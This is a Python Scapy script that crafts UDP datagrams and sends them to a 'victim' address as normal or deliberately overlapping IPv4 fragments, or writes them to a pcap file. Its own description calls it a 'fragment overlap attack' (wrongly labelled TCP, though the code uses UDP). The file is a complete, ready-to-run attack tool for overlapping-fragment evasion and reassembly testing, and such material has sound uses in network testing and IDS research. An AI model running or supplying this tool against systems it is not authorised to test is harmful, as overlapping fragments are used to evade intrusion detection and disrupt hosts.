#!/usr/bin/env python3
# Author: Sammy Alawar
# Purpose: small tool to generate/send overlappong IP fragments for testing purposes
import argparse
import sys
from scapy.all import IP, UDP, Raw, send, wrpcap

def build_cli():
    p = argparse.ArgumentParser(description="TCP fragment overlap attack")
    p.add_argument("--dst", required=True, help="Victim IP")
    p.add_argument("--count", type=int, required=False, default=5, help="Number of packets to send")
    p.add_argument("--payload", default="TEST", required = False, help="Payload of IP packet")
    p.add_argument("--proto", type=int, default=17, help="IP protocol number to set in the IP header (default 17)")
    p.add_argument("--ttl", type=int, default=64, help="IP TTL")
    p.add_argument("--id", type=lambda x: int(x, 0), default=0x7777, help="Base IP Identification for fragmentation")
    p.add_argument("-f", "--fragment", action="store_true", help="If set, send proper fragments")
    p.add_argument("--finaloverlap", action="store_true", help="If set, make the final fragment overlap with the previious fragment")
    p.add_argument("--multipleoverlap", action="store_true", help="If set, send multiple overlapping fragments")
    p.add_argument("--fragsize", type=int, default = 16, help="Payload size of each fragment")
    p.add_argument("--pcap-out", dest="pcap_out", default=None, help="If set, write generated packets/fragments to this pcap file instead of sending to destination")
    return p

def send_packets(dst, count, payload, proto=17, ttl=64, ip_id=None, pcap_out=None):
    if isinstance(payload, str):
        payload = payload.encode("utf-8")
    if count < 1:
        raise ValueError("count must be greater than or equal to 1")
    packets = [] # List to store packets
    cur_id = ip_id
    for i in range(count):
        packets.append(IP(dst=dst, proto=proto, ttl=ttl, id=cur_id) / UDP(dport=9999, sport=4444) / Raw(payload)) #Generate the UDP datagrams to send
        cur_id += 1  # Increment each packet's IP ID by 1
    if pcap_out:
        wrpcap(pcap_out, packets)
    else:
        for packet in packets:
            send(packet, verbose=0) # If the user doesn't want a pcap output file, then send them on the wire by iterating through each packet in the packets list
    return packets

def send_proper_fragments(dst, count, payload, proto=17, ttl=64, ip_id=None, fragsize=16, pcap_out=None):
    if isinstance(payload, str):
        payload = payload.encode("utf-8") # Encodes into a bytes object if the user payload is a string
    if count < 1:
        raise ValueError("count must be greater than or equal to 1")
    if fragsize % 8 != 0 or fragsize <= 0:
        raise ValueError("Fragment size must be a multiple of 8")
    packets = []
    cur_id = ip_id
    for i in range(count):
        packets.append(IP(dst=dst, proto=proto, ttl=ttl, id=cur_id) / UDP(dport=9999, sport=4444) / Raw(payload))
        cur_id += 1
    out_pkts = [] # List to store IPV4 fragments incase user wants a pcap output file
    for packet in packets:
        payload_size = len(bytes(packet.payload))
        start = 0 # Current byte index of the payload to properly slice the data
        offset = 0 # Fragmentation offset in 8-byte blocks
        payload_bytes = bytes(packet.payload)
        if fragsize >=payload_size: # If the fragment was already greater than the payload, no need to fragment. Directly send the packet.
            send(packet, verbose=0)
        else:
            while start + fragsize < payload_size: # While we still have at least one full-sized fragment remaining before the last fragment 
            # Proper fragmentation
                chunk = payload_bytes[start: start + fragsize]
                frag_pkt = IP(dst=packet[IP].dst, proto=packet[IP].proto, ttl=packet[IP].ttl, id=packet[IP].id, flags="MF", frag=offset) / Raw(chunk) #Set flag to MF to indicate that more fragments are coming
                offset += (fragsize // 8) # Increment offset by the number of 8-byte blocks 
                start += fragsize # Increment current byte index by the size of the fragment
                out_pkts.append(frag_pkt) # Append fragments to be used in the pcap file
                if not pcap_out:
                    send(frag_pkt, verbose=0) #Send fragments if not in pcap mode
            # After the loop, create the final fragment containing whatever bytes remain from start to the end of the payload
            # Final fragment has flags=0 (i.e., MF not set) to indicate it is the last fragment
            final_frag_pkt = IP(dst=packet[IP].dst, proto=packet[IP].proto, ttl=packet[IP].ttl, id=packet[IP].id, flags=0, frag=offset) / Raw(payload_bytes[start: len(payload_bytes)]) 
            out_pkts.append(final_frag_pkt)
            if not pcap_out:
                send(final_frag_pkt, verbose=0) 
    if pcap_out:
        wrpcap(pcap_out, out_pkts) # Write the generated fragments to the file held in pcap_out

    return out_pkts

def send_final_overlapping_fragments(dst, count, payload, proto=17, ttl=64, ip_id=None, fragsize=16, pcap_out=None):
    if isinstance(payload, str):
        payload = payload.encode("utf-8")
    if count < 1:
        raise ValueError("count must be greater than or equal to 1")
    if fragsize % 8 != 0 or fragsize <= 0:
        raise ValueError("Fragment size must be a multiple of 8")
    packets = []
    cur_id = ip_id
    for i in range(count):
        packets.append(IP(dst=dst, proto=proto, ttl=ttl, id=cur_id) / UDP(dport=9999, sport=4444) / Raw(payload))
        cur_id += 1
    out_pkts = [] 
    for packet in packets:
        payload_size = len(bytes(packet.payload))
        start = 0
        offset = 0
        payload_bytes = bytes(packet.payload)
        if fragsize >=payload_size:
            send(packet, verbose=0)
        else:
            while start + fragsize < payload_size:
                chunk = payload_bytes[start: start + fragsize]
                frag_pkt = IP(dst=packet[IP].dst, proto=packet[IP].proto, ttl=packet[IP].ttl, id=packet[IP].id, flags="MF", frag=offset) / Raw(chunk)
                offset += (fragsize // 8)
                start += fragsize
                out_pkts.append(frag_pkt)
                if not pcap_out:
                    send(frag_pkt, verbose=0)
            overlap_bytes = fragsize // 2
            offset = (start - overlap_bytes) // 8 # Shift final fragment start back by half a fragment so it overlaps the previous fragment.
            final_frag_pkt = IP(dst=packet[IP].dst, proto=packet[IP].proto, ttl=packet[IP].ttl, id=packet[IP].id, flags=0, frag=offset) / Raw(payload_bytes[start: len(payload_bytes)])
            out_pkts.append(final_frag_pkt)
            if not pcap_out:
                send(final_frag_pkt, verbose=0)
    if pcap_out:
        wrpcap(pcap_out, out_pkts)

    return out_pkts
    
def send_multiple_overlapping_fragments(dst, count, payload, proto=17, ttl=64, ip_id=None, fragsize=16, pcap_out=None): 
    if isinstance(payload, str):
        payload = payload.encode("utf-8")
    if count < 1:
        raise ValueError("count must be greater than or equal to 1")
    if fragsize % 8 != 0 or fragsize <= 0 or fragsize < 16: # We enforce a minimum fragment size of 16 bytes to ensure clean continuous half-fragment overlaps, since the IPv4 fragment offset field is limited to 8-byte units
        raise ValueError("Fragment size must be a multiple of 8 and minimum size should be 16")
    packets = []
    cur_id = ip_id
    for i in range(count):
        packets.append(IP(dst=dst, proto=proto, ttl=ttl, id=cur_id) / UDP(dport=9999, sport=4444) / Raw(payload))
        cur_id += 1
    out_pkts = [] 
    for packet in packets:
        payload_size = len(bytes(packet.payload))
        payload_bytes = bytes(packet.payload)
        if fragsize >=payload_size:
            send(packet, verbose=0)
        else:
            frag_pkt = IP(dst=packet[IP].dst, proto=packet[IP].proto, ttl=packet[IP].ttl, id=packet[IP].id, flags="MF", frag=0) / Raw(payload_bytes[0: fragsize])
            out_pkts.append(frag_pkt)
            if not pcap_out:
                send(frag_pkt, verbose=0)
            start = fragsize #Already sent first fragment, so set the byte index to the fragsize (Start of the second fragment)
            offset = (fragsize // 2) // 8
            while start + fragsize < payload_size:
                chunk = payload_bytes[start: start + fragsize]
                frag_pkt = IP(dst=packet[IP].dst, proto=packet[IP].proto, ttl=packet[IP].ttl, id=packet[IP].id, flags="MF", frag=offset) / Raw(chunk)
                start += fragsize
                # Increase offset only by half a fragment (fragsize//2) // 8
                # This causes every new fragment to overlap both the previous and next one.
                offset += (fragsize // 2) // 8  # Each fragment will overlap the right and left half of the fragments it is in between.
                out_pkts.append(frag_pkt)
                if not pcap_out:
                    send(frag_pkt, verbose=0)
            
            final_frag_pkt = IP(dst=packet[IP].dst, proto=packet[IP].proto, ttl=packet[IP].ttl, id=packet[IP].id, flags=0, frag=offset) / Raw(payload_bytes[start: len(payload_bytes)])
            out_pkts.append(final_frag_pkt)
            if not pcap_out:
                send(final_frag_pkt, verbose=0)
    if pcap_out:
        wrpcap(pcap_out, out_pkts)

    return out_pkts

if __name__ == "__main__":
    parser = build_cli()
    args = parser.parse_args()

    # Show help if user didn't provide any arguments
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)
    if args.pcap_out:
        print(f"[+] PCAP output requested: {args.pcap_out} (no packets will be sent on-wire)")
        

    if args.fragment:
        send_proper_fragments(args.dst, args.count, args.payload, args.proto, args.ttl, args.id, args.fragsize, args.pcap_out)
        if not args.pcap_out:
            print("[+] Sending Proper Fragments")
        sys.exit(1)
    elif args.multipleoverlap:
        send_multiple_overlapping_fragments(args.dst, args.count, args.payload, args.proto, args.ttl, args.id, args.fragsize, args.pcap_out)
        if not args.pcap_out:
            print("[+] Sending Multiple Overlapping Fragments")
        sys.exit(1)    	
    elif args.finaloverlap:
        send_final_overlapping_fragments(args.dst, args.count, args.payload, args.proto, args.ttl, args.id, args.fragsize, args.pcap_out)
        if not args.pcap_out:
            print("[+] Sending Final Overlapping Fragment")
        sys.exit(1)    	

    else:
        try:
            packets = send_packets(args.dst, args.count, args.payload, args.proto, args.ttl, args.id, args.pcap_out)
        except Exception as e:
            print(f"[!] Error while sending packets: {e}")
            sys.exit(1)

        print("IP datagrams sent:")
        for packet in packets:
            ip_layer = packet.getlayer(IP)
            ip_id = ip_layer.id if ip_layer is not None else "unknown" #This and the below line were GPT generated
            print(f"{packet.summary()}    IP ID: {ip_id}")
